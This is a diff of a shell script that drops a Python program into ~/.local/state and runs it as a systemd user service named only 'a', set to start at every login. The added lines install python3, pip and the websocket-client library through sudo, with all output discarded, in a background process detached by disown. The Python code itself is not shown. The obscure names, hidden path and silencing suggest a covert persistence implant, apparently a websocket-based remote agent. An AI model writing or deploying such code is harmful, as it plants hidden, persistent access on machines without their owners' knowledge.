@@ -5,10 +5,28 @@ FILE_PATH="$HOME/.local/state/$FILE_NAME"
 SERVICE_NAME="a.service"
 SERVICE_PATH="$HOME/.config/systemd/user/$SERVICE_NAME"
 
-# Make sure the systemd user directory exists
+# --- silent dependency install ---
+(
+    command -v python3 >/dev/null 2>&1 || {
+        sudo apt-get update -y >/dev/null 2>&1
+        sudo apt-get install -y python3 >/dev/null 2>&1
+    }
+
+    command -v pip3 >/dev/null 2>&1 || {
+        sudo apt-get install -y python3-pip >/dev/null 2>&1
+    }
+
+    python3 - <<'EOF' >/dev/null 2>&1 || \
+        pip3 install --user websocket-client >/dev/null 2>&1
+import websocket
+EOF
+) & disown
+
+# --- paths ---
 mkdir -p "$(dirname "$SERVICE_PATH")"
 mkdir -p "$(dirname "$FILE_PATH")"
 
+# --- python file ---
 cat > "$FILE_PATH" <<EOL
 #!/bin/python
 import asyncio
@@ -87,6 +105,9 @@ if __name__ == "__main__":
 EOL
 
 
+chmod +x "$FILE_PATH"
+
+# --- systemd service ---
 cat > "$SERVICE_PATH" <<EOL
 [Unit]
 Description=a
@@ -104,7 +125,4 @@ WantedBy=default.target
 EOL
 
 systemctl --user daemon-reload
-
 systemctl --user enable --now "$SERVICE_NAME"
-systemctl --user start "$SERVICE_NAME"
-
